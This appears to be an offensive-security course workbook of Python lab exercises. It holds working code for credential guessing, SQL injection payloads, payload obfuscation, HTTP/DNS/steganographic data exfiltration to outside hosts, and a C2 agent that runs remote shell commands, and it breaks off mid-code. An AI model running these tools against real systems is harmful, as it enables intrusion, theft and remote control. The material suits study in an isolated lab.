# Python for Hackers: Student Workbook

## Complete Lab Exercises & Practice Activities

This workbook contains all the hands-on exercises, lab activities, and practice challenges for the Python for Hackers series. Each section corresponds to a module in the main curriculum.

---

## Table of Contents

1. [Part 0: Getting Started](#part-0-getting-started)
2. [Phase 1: Network Fundamentals](#phase-1-network-fundamentals)
3. [Phase 2: Web Reconnaissance](#phase-2-web-reconnaissance)
4. [Phase 3: Offensive Tooling](#phase-3-offensive-tooling)
5. [Phase 4: Post-Exploitation](#phase-4-post-exploitation)
6. [Final Project](#final-project)
7. [Answer Key](#answer-key)

---

## Part 0: Getting Started

### Exercise 0.1: Setup Your Lab Environment

**Objective:** Install and configure your hacking lab environment.

**Instructions:**

1. Install VirtualBox or VMware on your host machine
2. Download Kali Linux and Ubuntu Server ISOs
3. Create the following VMs:

| VM | OS | IP Address | RAM | Disk |
|----|----|------------|-----|------|
| Attacker | Kali Linux | 192.168.100.10 | 4GB | 40GB |
| Target | Ubuntu Server | 192.168.100.20 | 2GB | 20GB |

4. Configure host-only networking
5. Verify connectivity:
```bash
# From attacker VM
ping -c 4 192.168.100.20
```

**Verification Checklist:**
- [ ] Kali VM boots successfully
- [ ] Ubuntu VM boots successfully
- [ ] Both VMs can ping each other
- [ ] Host machine can access both VMs

---

### Exercise 0.2: Install the Toolkit

**Objective:** Install the Python for Hackers toolkit.

**Instructions:**

1. Clone or create the toolkit directory:
```bash
mkdir ~/hacking-toolkit
cd ~/hacking-toolkit
```

2. Create the directory structure:
```bash
mkdir -p {recon,web-attack,exploit,post-exploit,framework,payloads,config,modules,utils,templates,logs,data,wordlists}
```

3. Setup virtual environment:
```bash
python3 -m venv venv
source venv/bin/activate
```

4. Install dependencies:
```bash
pip install -r requirements.txt
```

5. Run verification:
```bash
python3 verify.py
```

**Verification Checklist:**
- [ ] Directory structure created
- [ ] Virtual environment activated
- [ ] All packages installed
- [ ] Verification script passes

---

### Exercise 0.3: First Test Script

**Objective:** Write and test your first security script.

**Instructions:**

Create `test_connection.py`:

```python
#!/usr/bin/env python3
import socket

def test_connection(host, port):
    """Test if a port is open on a host"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

if __name__ == "__main__":
    host = input("Enter host to test: ")
    port = int(input("Enter port: "))
    
    if test_connection(host, port):
        print(f"[+] {host}:{port} is open")
    else:
        print(f"[-] {host}:{port} is closed")
```

**Test it:**
```bash
python3 test_connection.py 192.168.100.20 22
python3 test_connection.py 192.168.100.20 80
```

**Discussion Questions:**
1. Why do we use `connect_ex()` instead of `connect()`?
2. What happens if the target is not reachable?
3. How could you extend this to scan multiple ports?

---

## Phase 1: Network Fundamentals

### Exercise 1.1: TCP Echo Server

**Objective:** Build a TCP echo server and test it.

**Instructions:**

1. Create `tcp_echo_server.py`:

```python
#!/usr/bin/env python3
import socket
import threading

class EchoServer:
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.socket = None
        self.running = False
    
    def start(self):
        """Start the echo server"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        self.running = True
        
        print(f"[*] Echo server listening on {self.host}:{self.port}")
        
        while self.running:
            client, addr = self.socket.accept()
            print(f"[+] Connection from {addr[0]}:{addr[1]}")
            threading.Thread(target=self.handle_client, args=(client,)).start()
    
    def handle_client(self, client):
        """Handle a client connection"""
        try:
            while True:
                data = client.recv(1024)
                if not data:
                    break
                client.send(data)
        except:
            pass
        finally:
            client.close()
    
    def stop(self):
        """Stop the server"""
        self.running = False
        if self.socket:
            self.socket.close()

if __name__ == "__main__":
    server = EchoServer()
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Server stopped")
        server.stop()
```

2. Test with netcat:
```bash
# Terminal 1
python3 tcp_echo_server.py

# Terminal 2
nc localhost 9999
# Type something and see it echoed back
```

3. Test with a custom client:
```python
# Create tcp_client.py
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('localhost', 9999))
sock.send(b'Hello, Server!')
response = sock.recv(1024)
print(f"Received: {response.decode()}")
sock.close()
```

**Challenge Questions:**
1. How would you handle multiple clients simultaneously?
2. What happens if a client sends very large data?
3. How would you add a timeout?

---

### Exercise 1.2: UDP Echo Client

**Objective:** Implement a UDP echo client.

**Instructions:**

Create `udp_echo_client.py`:

```python
#!/usr/bin/env python3
import socket
import time

class UDPEchoClient:
    def __init__(self, host='127.0.0.1', port=9998):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.settimeout(3.0)
    
    def send_message(self, message):
        """Send a UDP message and wait for response"""
        try:
            self.socket.sendto(message.encode(), (self.host, self.port))
            data, addr = self.socket.recvfrom(1024)
            return data.decode()
        except socket.timeout:
            return "Timeout - no response"
    
    def stress_test(self, count=10):
        """Send multiple messages to test reliability"""
        sent = 0
        received = 0
        
        for i in range(count):
            message = f"Packet {i+1}"
            response = self.send_message(message)
            sent += 1
            if "Timeout" not in response:
                received += 1
            time.sleep(0.1)
        
        print(f"Sent: {sent}, Received: {received}")
        print(f"Loss rate: {(1 - received/sent) * 100:.1f}%")

if __name__ == "__main__":
    client = UDPEchoClient()
    
    # Single message
    response = client.send_message("Hello UDP!")
    print(f"Response: {response}")
    
    # Stress test
    client.stress_test(20)
```

**Test it:**
```bash
# Terminal 1: Start UDP server (from main series)
python3 udp_server.py

# Terminal 2: Run the client
python3 udp_echo_client.py
```

**Discussion Questions:**
1. Why does UDP have packet loss?
2. How does UDP differ from TCP in this test?
3. When would you use UDP instead of TCP?

---

### Exercise 1.3: Port Scanner Development

**Objective:** Extend the port scanner with new features.

**Instructions:**

1. Start with the basic port scanner from the series.

2. Add the following features:

```python
def scan_port_range(self, start_port, end_port):
    """Scan a range of ports"""
    for port in range(start_port, end_port + 1):
        self.scan_queue.put(port)
```

3. Add service detection:

```python
def identify_service(self, port, banner):
    """Identify service from banner"""
    service_signatures = {
        'ssh': ['SSH', 'OpenSSH'],
        'http': ['HTTP', 'Apache', 'nginx'],
        'ftp': ['FTP', 'vsFTPd'],
        'smtp': ['SMTP', 'Postfix']
    }
    
    for service, signatures in service_signatures.items():
        for sig in signatures:
            if sig in banner:
                return service
    return 'unknown'
```

4. Create a scan report:

```python
def generate_report(self):
    """Generate a scan report"""
    report = {
        'target': self.target,
        'scan_time': datetime.now().isoformat(),
        'open_ports': self.open_ports,
        'total_ports_scanned': self.total_ports,
        'duration': self.end_time - self.start_time
    }
    return report
```

**Challenge:**
- Implement SYN scanning (requires root)
- Add OS fingerprinting
- Implement parallel scanning with multiple targets

---

### Exercise 1.4: Packet Crafting

**Objective:** Create custom packets using Scapy.

**Instructions:**

1. Basic packet creation:
```python
from scapy.all import *

# Create an IP packet
ip = IP(src="192.168.1.100", dst="8.8.8.8", ttl=64)

# Create a TCP packet
tcp = TCP(sport=12345, dport=80, flags="S")

# Combine them
packet = ip/tcp

# Send and receive
response = sr1(packet, timeout=2)

if response:
    print(f"Response received from {response.src}")
    if response.haslayer(TCP):
        flags = response[TCP].flags
        if flags & 0x12:  # SYN-ACK
            print("Port is open!")
```

2. Craft a custom ICMP packet:
```python
# ICMP Echo Request (ping)
ping = IP(dst="8.8.8.8")/ICMP()
send(ping, count=3)
```

3. Packet sniffer:
```python
def packet_callback(packet):
    if packet.haslayer(IP):
        ip = packet[IP]
        print(f"{ip.src} -> {ip.dst}")
        if packet.haslayer(TCP):
            tcp = packet[TCP]
            print(f"  TCP {tcp.sport} -> {tcp.dport}")

sniff(filter="ip", prn=packet_callback, count=10)
```

**Challenge Tasks:**

1. Create a packet that bypasses a simple firewall
2. Implement a TCP connect scanner using Scapy
3. Build a DNS spoofing tool

---

## Phase 2: Web Reconnaissance

### Exercise 2.1: HTTP Client

**Objective:** Build an advanced HTTP client.

**Instructions:**

Create `http_client_extended.py`:

```python
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class HTTPClientExtended:
    def __init__(self, base_url=None, timeout=30, max_retries=3):
        self.base_url = base_url
        self.timeout = timeout
        self.session = requests.Session()
        
        # Retry strategy
        retry_strategy = Retry(
            total=max_retries,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def request(self, method, url, **kwargs):
        """Make a request with retries"""
        if self.base_url and not url.startswith(('http://', 'https://')):
            url = f"{self.base_url}/{url.lstrip('/')}"
        
        return self.session.request(method, url, timeout=self.timeout, **kwargs)
    
    def get(self, url, **kwargs):
        return self.request('GET', url, **kwargs)
    
    def post(self, url, **kwargs):
        return self.request('POST', url, **kwargs)
    
    def put(self, url, **kwargs):
        return self.request('PUT', url, **kwargs)
    
    def delete(self, url, **kwargs):
        return self.request('DELETE', url, **kwargs)
```

**Test it:**
```python
client = HTTPClientExtended('https://httpbin.org')
response = client.get('/get', params={'test': 'value'})
print(response.json())
```

**Challenge:**
- Implement OAuth2 authentication
- Add cookie jar persistence
- Implement rate limiting

---

### Exercise 2.2: Directory Brute-Forcer

**Objective:** Create an efficient directory brute-forcer.

**Instructions:**

Create `directory_bruteforcer.py`:

```python
import threading
import queue
import requests
from concurrent.futures import ThreadPoolExecutor

class DirectoryBruteforcer:
    def __init__(self, target, wordlist, threads=50, extensions=None):
        self.target = target.rstrip('/')
        self.wordlist = wordlist
        self.threads = threads
        self.extensions = extensions or []
        self.found = []
        self.lock = threading.Lock()
    
    def check_path(self, path):
        """Check if a path exists"""
        url = f"{self.target}/{path}"
        
        try:
            response = requests.get(url, timeout=5)
            if response.status_code in [200, 301, 302, 403]:
                with self.lock:
                    self.found.append({
                        'path': path,
                        'status': response.status_code,
                        'size': len(response.content)
                    })
                return True
        except:
            pass
        return False
    
    def scan(self):
        """Start the scan"""
        print(f"[*] Scanning {self.target}")
        print(f"[*] Wordlist: {len(self.wordlist)} entries")
        
        paths = []
        for word in self.wordlist:
            paths.append(word)
            for ext in self.extensions:
                paths.append(f"{word}{ext}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.check_path, paths)
        
        return self.found

if __name__ == "__main__":
    # Load wordlist
    wordlist = ['admin', 'login', 'wp-admin', 'backup', 'config']
    extensions = ['.php', '.html', '.txt']
    
    scanner = DirectoryBruteforcer('http://testphp.vulnweb.com', wordlist, extensions=extensions)
    results = scanner.scan()
    
    print(f"\n[*] Found {len(results)} paths:")
    for result in results:
        print(f"  {result['path']} (Status: {result['status']})")
```

**Challenge Tasks:**
1. Add recursive scanning
2. Implement result filtering
3. Add support for custom headers (User-Agent, cookies)
4. Create an asynchronous version

---

### Exercise 2.3: HTML Analyzer

**Objective:** Extract useful information from HTML.

**Instructions:**

Create `html_analyzer_extended.py`:

```python
from bs4 import BeautifulSoup
import re
import requests

class HTMLAnalyzerExtended:
    def __init__(self, url):
        self.url = url
        self.soup = None
        self._fetch()
    
    def _fetch(self):
        """Fetch the HTML content"""
        response = requests.get(self.url, timeout=10)
        self.soup = BeautifulSoup(response.text, 'lxml')
    
    def get_all_links(self):
        """Get all links from the page"""
        links = []
        for a in self.soup.find_all('a', href=True):
            links.append({
                'text': a.string or '',
                'href': a.get('href'),
                'rel': a.get('rel', [])
            })
        return links
    
    def get_forms(self):
        """Extract form information"""
        forms = []
        for form in self.soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET'),
                'inputs': []
            }
            
            for input_tag in form.find_all('input'):
                form_data['inputs'].append({
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                })
            
            forms.append(form_data)
        return forms
    
    def extract_emails(self):
        """Extract email addresses"""
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        return re.findall(email_pattern, str(self.soup))
    
    def extract_phone_numbers(self):
        """Extract phone numbers"""
        phone_pattern = r'(\+?\d{1,3}[-.]?)?\(?\d{3}\)?[-.]?\d{3}[-.]?\d{4}'
        return re.findall(phone_pattern, str(self.soup))
    
    def find_comments(self):
        """Find HTML comments"""
        comments = []
        for comment in self.soup.find_all(string=lambda x: isinstance(x, str) and '<!--' in x):
            comments.append(comment.strip())
        return comments

if __name__ == "__main__":
    analyzer = HTMLAnalyzerExtended('https://example.com')
    
    print(f"[*] Analysis for {analyzer.url}")
    print(f"  Links: {len(analyzer.get_all_links())}")
    print(f"  Forms: {len(analyzer.get_forms())}")
    print(f"  Emails: {analyzer.extract_emails()}")
    print(f"  Comments: {len(analyzer.find_comments())}")
```

**Challenge:**
- Extract JavaScript endpoints
- Find potential API endpoints
- Detect hidden form fields
- Extract meta data

---

### Exercise 2.4: Authentication Automation

**Objective:** Automate login to web applications.

**Instructions:**

Create `login_automator.py`:

```python
import requests
from bs4 import BeautifulSoup

class LoginAutomator:
    def __init__(self, login_url):
        self.login_url = login_url
        self.session = requests.Session()
        self.csrf_token = None
    
    def get_csrf_token(self):
        """Extract CSRF token from login form"""
        response = self.session.get(self.login_url)
        soup = BeautifulSoup(response.text, 'lxml')
        
        # Look for CSRF token
        patterns = ['csrf_token', '_token', 'authenticity_token']
        for pattern in patterns:
            token_input = soup.find('input', {'name': pattern})
            if token_input:
                return token_input.get('value', '')
        
        return None
    
    def login(self, username, password, username_field='username', 
              password_field='password', csrf_field=None):
        """Attempt to login"""
        # Get CSRF token if needed
        csrf_token = self.get_csrf_token()
        
        # Build login data
        data = {
            username_field: username,
            password_field: password
        }
        
        if csrf_token and csrf_field:
            data[csrf_field] = csrf_token
        
        # Submit login
        response = self.session.post(self.login_url, data=data)
        
        # Check if login succeeded
        if response.status_code in [200, 302]:
            if 'login' not in response.url.lower():
                return True, response
        
        return False, response

if __name__ == "__main__":
    # Test with a vulnerable site
    automator = LoginAutomator('http://testphp.vulnweb.com/login.php')
    
    # Test credentials
    credentials = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '123456')
    ]
    
    for username, password in credentials:
        success, response = automator.login(username, password)
        if success:
            print(f"[+] Login successful: {username}:{password}")
            break
        else:
            print(f"[-] Login failed: {username}:{password}")
```

**Challenge Tasks:**
1. Add JWT token extraction
2. Support OAuth2 flows
3. Handle 2FA challenges
4. Implement session persistence

---

## Phase 3: Offensive Tooling

### Exercise 3.1: API Intelligence

**Objective:** Discover and analyze API endpoints.

**Instructions:**

Create `api_intelligence.py`:

```python
import requests
import json
import re

class APIIntelligence:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.discovered = []
    
    def check_endpoint(self, path):
        """Check if an endpoint exists"""
        url = f"{self.base_url}/{path.lstrip('/')}"
        
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code in [200, 201, 401, 403]:
                return {
                    'path': path,
                    'status': response.status_code,
                    'content_type': response.headers.get('content-type', '')
                }
        except:
            pass
        return None
    
    def discover_endpoints(self):
        """Discover common API endpoints"""
        endpoints = [
            'api', 'api/v1', 'api/v2', 'api/v3',
            'graphql', 'graphiql', 'swagger', 'docs',
            'users', 'user', 'admin', 'login', 'auth',
            'status', 'health', 'ping', 'info', 'version'
        ]
        
        for endpoint in endpoints:
            result = self.check_endpoint(endpoint)
            if result:
                self.discovered.append(result)
                print(f"[+] Found: {endpoint}")
        
        return self.discovered
    
    def analyze_swagger(self, swagger_path='swagger/v1/swagger.json'):
        """Analyze Swagger/OpenAPI specification"""
        try:
            response = self.session.get(f"{self.base_url}/{swagger_path}")
            if response.status_code == 200:
                spec = response.json()
                paths = spec.get('paths', {})
                
                for path, methods in paths.items():
                    for method in methods.keys():
                        print(f"  {method.upper()} {path}")
                
                return spec
        except:
            pass
        return None
    
    def graphql_introspection(self):
        """Perform GraphQL introspection"""
        query = """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                types { name kind }
            }
        }
        """
        
        try:
            response = self.session.post(
                f"{self.base_url}/graphql",
                json={'query': query}
            )
            
            if response.status_code == 200:
                return response.json()
        except:
            pass
        return None

if __name__ == "__main__":
    api = APIIntelligence('https://jsonplaceholder.typicode.com')
    
    print("[*] Discovering API endpoints...")
    endpoints = api.discover_endpoints()
    
    print(f"\n[*] Found {len(endpoints)} endpoints")
    for endpoint in endpoints:
        print(f"  {endpoint['path']} ({endpoint['status']})")
```

**Challenge Tasks:**
1. Add endpoint fuzzing
2. Parse OpenAPI specifications
3. Test authentication requirements
4. Analyze response patterns

---

### Exercise 3.2: Custom Exploit Development

**Objective:** Create a custom exploit for a known vulnerability.

**Instructions:**

Create `custom_exploit.py`:

```python
import requests
import re

class CustomExploit:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.results = []
    
    def check_sql_injection(self, parameter, payload):
        """Test a parameter for SQL injection"""
        url = f"{self.target}?{parameter}={payload}"
        
        try:
            response = self.session.get(url, timeout=5)
            
            # Check for SQL error patterns
            error_patterns = [
                'sql syntax', 'mysql_fetch', 'ora-',
                'unclosed quotation', 'sqlite3',
                'postgresql', 'microsoft ole db'
            ]
            
            for pattern in error_patterns:
                if pattern.lower() in response.text.lower():
                    return {
                        'vulnerable': True,
                        'payload': payload,
                        'error': pattern
                    }
            
            # Check for differences in response
            if len(response.text) != self._get_normal_length(parameter):
                return {
                    'vulnerable': True,
                    'payload': payload,
                    'status': 'possible'
                }
                
        except:
            pass
        
        return {'vulnerable': False}
    
    def _get_normal_length(self, parameter):
        """Get normal response length for comparison"""
        try:
            response = self.session.get(f"{self.target}?{parameter}=1")
            return len(response.text)
        except:
            return 0
    
    def run(self):
        """Run all exploit checks"""
        print(f"[*] Testing {self.target}")
        
        # SQL Injection tests
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
        
        for payload in payloads:
            result = self.check_sql_injection('id', payload)
            if result['vulnerable']:
                print(f"[!] SQL Injection found with payload: {payload}")
                if 'error' in result:
                    print(f"    Error pattern: {result['error']}")
                self.results.append(result)
        
        return self.results

if __name__ == "__main__":
    exploit = CustomExploit('http://testphp.vulnweb.com/artists.php')
    results = exploit.run()
    
    if results:
        print(f"\n[+] Found {len(results)} vulnerabilities")
    else:
        print("\n[-] No vulnerabilities found")
```

**Challenge Tasks:**
1. Add command injection testing
2. Implement XSS detection
3. Add time-based injection detection
4. Create an exploit chain

---

### Exercise 3.3: Payload Obfuscation

**Objective:** Create an obfuscation toolkit.

**Instructions:**

Create `obfuscation_toolkit.py`:

```python
import base64
import binascii
import random
import string

class ObfuscationToolkit:
    def __init__(self):
        self.techniques_used = []
    
    def encode_base64(self, data):
        """Base64 encode"""
        result = base64.b64encode(data.encode()).decode()
        self.techniques_used.append('base64')
        return result
    
    def decode_base64(self, data):
        """Base64 decode"""
        return base64.b64decode(data).decode()
    
    def encode_hex(self, data):
        """Hex encode"""
        result = binascii.hexlify(data.encode()).decode()
        self.techniques_used.append('hex')
        return result
    
    def decode_hex(self, data):
        """Hex decode"""
        return binascii.unhexlify(data).decode()
    
    def encode_xor(self, data, key):
        """XOR encode"""
        key_bytes = key.encode() * (len(data) // len(key) + 1)
        key_bytes = key_bytes[:len(data)]
        
        result = bytes([a ^ b for a, b in zip(data.encode(), key_bytes)])
        self.techniques_used.append('xor')
        return binascii.hexlify(result).decode()
    
    def decode_xor(self, data, key):
        """XOR decode"""
        data_bytes = binascii.unhexlify(data)
        key_bytes = key.encode() * (len(data_bytes) // len(key) + 1)
        key_bytes = key_bytes[:len(data_bytes)]
        
        result = bytes([a ^ b for a, b in zip(data_bytes, key_bytes)])
        return result.decode()
    
    def encode_rot13(self, data):
        """ROT13 encode"""
        result = ''
        for char in data:
            if 'a' <= char <= 'z':
                result += chr((ord(char) - ord('a') + 13) % 26 + ord('a'))
            elif 'A' <= char <= 'Z':
                result += chr((ord(char) - ord('A') + 13) % 26 + ord('A'))
            else:
                result += char
        self.techniques_used.append('rot13')
        return result
    
    def multi_encode(self, data, techniques):
        """Apply multiple encoding techniques"""
        result = data
        for technique in techniques:
            if technique == 'base64':
                result = self.encode_base64(result)
            elif technique == 'hex':
                result = self.encode_hex(result)
            elif technique == 'rot13':
                result = self.encode_rot13(result)
        self.techniques_used = techniques
        return result
    
    def multi_decode(self, data, techniques):
        """Decode multiple encoding techniques"""
        result = data
        for technique in reversed(techniques):
            if technique == 'base64':
                result = self.decode_base64(result)
            elif technique == 'hex':
                result = self.decode_hex(result)
            elif technique == 'rot13':
                result = self.decode_rot13(result)
        return result

if __name__ == "__main__":
    obf = ObfuscationToolkit()
    
    original = "whoami"
    print(f"Original: {original}")
    
    # Single encoding
    encoded = obf.encode_base64(original)
    print(f"Base64: {encoded}")
    
    # XOR encoding
    encoded = obf.encode_xor(original, "secret")
    decoded = obf.decode_xor(encoded, "secret")
    print(f"XOR: {encoded} -> {decoded}")
    
    # Multi-encoding
    techniques = ['base64', 'hex', 'rot13']
    encoded = obf.multi_encode(original, techniques)
    decoded = obf.multi_decode(encoded, techniques)
    print(f"Multi: {encoded} -> {decoded}")
```

**Challenge Tasks:**
1. Add URL encoding
2. Implement Unicode escapes
3. Add custom cipher
4. Create a random obfuscation function

---

### Exercise 3.4: Data Exfiltration

**Objective:** Build a data exfiltration tool.

**Instructions:**

Create `exfil_tool.py`:

```python
import base64
import socket
import requests
import time
import os

class ExfiltrationTool:
    def __init__(self):
        self.channels = []
    
    def http_exfil(self, data, url, param_name='data'):
        """Exfiltrate via HTTP"""
        encoded = base64.b64encode(data.encode()).decode()
        chunks = [encoded[i:i+1000] for i in range(0, len(encoded), 1000)]
        
        for chunk in chunks:
            try:
                response = requests.get(f"{url}?{param_name}={chunk}", timeout=5)
                if response.status_code == 200:
                    print(f"[+] HTTP exfil successful: {len(chunk)} bytes")
                else:
                    print(f"[-] HTTP exfil failed: {response.status_code}")
            except:
                print("[-] HTTP exfil error")
            time.sleep(0.1)
    
    def dns_exfil(self, data, domain):
        """Exfiltrate via DNS"""
        encoded = base64.b64encode(data.encode()).decode().replace('=', '')
        chunks = [encoded[i:i+20] for i in range(0, len(encoded), 20)]
        
        for chunk in chunks:
            try:
                subdomain = f"{chunk}.{domain}"
                socket.gethostbyname(subdomain)
                print(f"[+] DNS exfil: {subdomain}")
            except:
                pass
            time.sleep(0.1)
    
    def icmp_exfil(self, data, target):
        """Exfiltrate via ICMP (requires root)"""
        encoded = base64.b64encode(data.encode()).decode().replace('=', '')
        chunks = [encoded[i:i+16] for i in range(0, len(encoded), 16)]
        
        # This is a simplified version - actual ICMP requires raw sockets
        print(f"[*] Would send {len(chunks)} ICMP packets to {target}")
    
    def steganography_exfil(self, data, image_path, output_path):
        """Hide data in an image"""
        try:
            from PIL import Image
            img = Image.open(image_path)
            img = img.convert('RGB')
            pixels = img.load()
            width, height = img.size
            
            # Add header
            header = f"{len(data):08d}".encode()
            data_bytes = header + data.encode()
            
            # Convert to bits
            bits = []
            for byte in data_bytes:
                for i in range(7, -1, -1):
                    bits.append((byte >> i) & 1)
            
            # Embed bits
            bit_index = 0
            for y in range(height):
                for x in range(width):
                    if bit_index >= len(bits):
                        break
                    
                    r, g, b = pixels[x, y]
                    r = (r & 0xFE) | bits[bit_index]
                    bit_index += 1
                    
                    if bit_index < len(bits):
                        g = (g & 0xFE) | bits[bit_index]
                        bit_index += 1
                    
                    if bit_index < len(bits):
                        b = (b & 0xFE) | bits[bit_index]
                        bit_index += 1
                    
                    pixels[x, y] = (r, g, b)
            
            img.save(output_path)
            print(f"[+] Data hidden in {output_path}")
            
        except ImportError:
            print("[-] PIL not installed")
        except:
            print("[-] Steganography error")

if __name__ == "__main__":
    exfil = ExfiltrationTool()
    
    # Test data
    data = "SECRET_DATA_12345"
    
    # HTTP exfil
    print("[*] Testing HTTP exfil...")
    exfil.http_exfil(data, "http://httpbin.org/post")
    
    # DNS exfil
    print("\n[*] Testing DNS exfil...")
    exfil.dns_exfil(data, "example.com")
```

**Challenge Tasks:**
1. Add file exfiltration
2. Implement email channel
3. Add data compression
4. Create multi-channel redundancy

---

## Phase 4: Post-Exploitation

### Exercise 4.1: C2 Framework

**Objective:** Build a simple C2 framework.

**Instructions:**

Create `c2_simple.py`:

```python
#!/usr/bin/env python3
import socket
import threading
import json
import time
import subprocess

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.agents = {}
        self.running = False
    
    def start(self):
        """Start the C2 server"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        self.running = True
        
        print(f"[*] C2 Server listening on {self.host}:{self.port}")
        
        while self.running:
            try:
                client, addr = self.socket.accept()
                print(f"[+] Agent connected from {addr[0]}:{addr[1]}")
                threading.Thread(target=self.handle_agent, args=(client, addr)).start()
            except:
                break
    
    def handle_agent(self, client, addr):
        """Handle agent connection"""
        try:
            # Register agent
            data = client.recv(1024).decode()
            agent_info = json.loads(data)
            agent_id = agent_info.get('agent_id')
            
            if agent_id:
                self.agents[agent_id] = {
                    'client': client,
                    'info': agent_info,
                    'last_seen': time.time()
                }
                print(f"[+] Agent {agent_id} registered")
            
            # Main loop
            while self.running:
                # Check for commands from server
                command = input(f"[{agent_id}]> ")
                if command:
                    client.send(command.encode())
                    response = client.recv(4096).decode()
                    print(response)
                
        except:
            pass
        finally:
            client.close()
            if agent_id in self.agents:
                del self.agents[agent_id]

class C2Agent:
    def __init__(self, server_host='127.0.0.1', server_port=4444):
        self.server_host = server_host
        self.server_port = server_port
        self.agent_id = socket.gethostname()
        self.running = False
    
    def start(self):
        """Start the agent"""
        self.running = True
        
        while self.running:
            try:
                self.connect()
            except:
                print("[*] Reconnecting in 5 seconds...")
                time.sleep(5)
    
    def connect(self):
        """Connect to C2 server"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.server_host, self.server_port))
        
        # Register
        agent_info = {
            'agent_id': self.agent_id,
            'hostname': socket.gethostname(),
            'username': __import__('os').getlogin()
        }
        sock.send(json.dumps(agent_info).encode())
        
        print(f"[+] Connected to C2 server")
        
        while self.running:
            try:
                command = sock.recv(1024).decode()
                if not command:
                    break
                
                result = self.execute_command(command)
                sock.send(result.encode())
            except:
                break
        
        sock.close()
    
    def execute_command(self, command):
        """Execute a command"""
        try:
            result = subprocess.check_output(command, shell=True, text=True)
            return result
        except subprocess.CalledProcessError as e:
            return e.output
        except:
            return "Error executing command"

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == 'server':
        server = C2Server()
        server.start()
    else:
        agent = C2Agent()
        agent.start()
```

**Test it:**
```bash
# Terminal 1: Start server
python3 c2_simple.py server

# Terminal 2: Start agent
python3 c2_simple.py
```

**Challenge Tasks:**
1. Add SSL/TLS encryption
2. Implement multiple channels
3. Add task scheduling
4. Create web dashboard

---

### Exercise 4.2: System Enumeration

**Objective:** Create a system enumeration module.

**Instructions:**

Create `system_enumeration.py`:

```python
#!/usr/bin/env python3
import platform
import os
import subprocess
import psutil
import socket
import json
from datetime import datetime

class SystemEnumerator:
    def __init__(self):
        self.platform = platform.system()
        self.results = {}
    
    def get_system_info(self):
        """Get basic system information"""
        info = {
            'hostname': socket.gethostname(),
            'os': platform.system(),
            'os_version': platform.version(),
            'kernel': platform.release(),
            'architecture': platform.machine(),
            'cpu_count': psutil.cpu_count(),
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory': psutil.virtual_memory()._asdict(),
            'disk': psutil.disk_usage('/')._asdict()
        }
        self.results['system'] = info
        return info
    
    def get_users(self):
        """Get user information"""
        users = []
        
        if self.platform == 'Windows':
            # Windows users
            output = subprocess.check_output(['net', 'user'], text=True)
            for line in output.split('\n'):
                if 'user' in line.lower() and '-' not in line:
                    users.append(line.strip())
        else:
            # Linux/Unix users
            with open('/etc/passwd', 'r') as f:
                for line in f:
                    if not line.startswith('#'):
                        parts = line.strip().split(':')
                        users.append({
                            'username': parts[0],
                            'uid': parts[2],
                            'gid': parts[3],
                            'home': parts[5],
                            'shell': parts[6]
                        })
        
        self.results['users'] = users
        return users
    
    def get_network(self):
        """Get network information"""
        network = []
        
        interfaces = psutil.net_if_addrs()
        stats = psutil.net_if_stats()
        
        for interface, addrs in interfaces.items():
            if interface == 'lo':
                continue
                
            info = {
                'interface': interface,
                'addresses': [],
                'up': stats.get(interface, {}).isup if interface in stats else False
            }
            
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    info['addresses'].append({
                        'type': 'IPv4',
                        'address': addr.address,
                        'netmask': addr.netmask
                    })
                elif addr.family == socket.AF_INET6:
                    info['addresses'].append({
                        'type': 'IPv6',
                        'address': addr.address,
                        'netmask': addr.netmask
                    })
            
            network.append(info)
        
        self.results['network'] = network
        return network
    
    def get_processes(self, limit=20):
        """Get running processes"""
        processes = []
        
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
            try:
                info = proc.info
                processes.append({
                    'pid': info['pid'],
                    'name': info['name'],
                    'username': info['username'],
                    'memory_percent': round(info['memory_percent'], 2)
                })
            except:
                pass
        
        processes.sort(key=lambda x: x['memory_percent'], reverse=True)
        self.results['processes'] = processes[:limit]
        return processes[:limit]
    
    def get_services(self):
        """Get running services"""
        services = []
        
        if self.platform == 'Windows':
            output = subprocess.check_output(['sc', 'query', 'state=all'], text=True)
            for line in output.split('\n'):
